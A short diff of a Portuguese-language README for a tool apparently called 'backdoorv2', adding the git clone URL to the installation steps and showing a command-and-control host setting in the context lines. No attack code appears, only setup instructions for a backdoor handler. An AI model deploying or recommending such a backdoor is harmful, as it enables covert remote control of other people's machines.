@@ -85,7 +85,7 @@ C2='c2c.meucdois.com'
 Dê um clone no repositório, no servidor você irá precisar apenas da parte do handler. 
 
 ```
-git clone
+git clone https://github.com/d34dfr4m3/backdoorv2.git
 ```
 
 Realize a instação das dependências:
